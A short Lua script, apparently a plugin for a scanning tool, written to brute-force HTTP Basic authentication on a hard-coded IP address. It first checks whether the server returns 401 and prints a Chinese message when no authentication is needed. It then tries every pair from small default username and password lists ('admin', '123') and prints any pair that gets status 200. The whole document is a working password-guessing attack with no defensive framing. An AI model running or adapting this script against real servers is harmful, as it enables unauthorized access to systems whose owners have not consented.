username = {"admin","123"}
password = {"admin","123"}

status,basic,err = http.head("47.93.57.130",443,"/")

if err ~= "" then
    print("err"..err)
    return
end

if status ~= 401 or not basic then
    print("err 不需要验证")
end 

print("----------")

for i,user in ipairs(username) do 
    for j,pass in ipairs(password) do
        status,basic,err = http.get("47.93.57.130",443,user,pass,"/")
        if status ==200 then
            print("user:"..user.."pass:"..pass)
            break
        end
    end
end
